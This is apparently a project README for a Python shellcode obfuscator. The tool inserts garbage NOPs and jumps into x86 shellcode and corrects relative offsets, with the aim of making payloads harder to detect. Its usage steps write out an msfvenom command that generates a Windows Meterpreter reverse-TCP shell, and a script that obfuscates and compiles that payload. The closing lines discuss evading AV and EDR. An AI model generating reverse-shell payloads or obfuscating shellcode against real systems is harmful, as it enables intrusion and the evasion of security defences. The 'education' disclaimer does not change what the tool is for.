## Disclamer
It's only for education purpases. I mean, you can try to understand what is going on here, but I strongly do not recommend XD
Actually i would be glad to any suggestions

## Intro
Shellcode has several key differences compared to usial assembly:
* Only relative addresses, without absolute addressing
* No variables and links (it's absolute addressing), only direct saving values to registers or something
* All shellcode bytes without special chars, ex. 0x00, 0x0a (not always)
Therefore, shellcode can work in any injections without connection to injected code

## Description
This stuff should obfuscate generated shellcode without manual instructions change

Python script doing next things:
* Take random x86 shellcode
* Paste garbage instructions, such nops, jumps and random data inside this new jumps without.
* Correnting all relative addresses in all jumps, calls, and other opcodes with EIP changing.

![pythonfuscator](https://github.com/user-attachments/assets/f9012567-7fcd-4842-890f-63b3a74abcd3)


Others VS projects only needs for shellcode injection. Please, use anything but them.

## Usage
1. Create any shellcode with specific format. For example:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw  | pwn disasm | sed 's/^[ \t]*[0-9a-z]*:[ \t]*//g' | sed 's/[ \t]\{2,\}.*//g' > msf.raw
```
2. Change file path in main.py. you can choose ofcuscation methods and interations number. Also change it in main.py. main.py example:
```python
import shell_bytes
shellcode = shell_bytes.ShellBytes('../rev.hex')
print('Was ', len(shellcode.get_payload()), ' instructions')
shellcode.expand_offsets()
shellcode.add_garbage_instructions_after_each_instruction_with_jmp()
print('Now ', len(shellcode.get_payload()), ' instructions')
shellcode.compile('./resources/my_payload.raw')
```
3. That's all. I don't think the logic has been changed, unless it was sgn.

Yes, i know that AV and EDR can easy detect NOPs and JMPs signature. But the concept itself works, and it may be applied for more difficult examples, such as shellcode shuffling
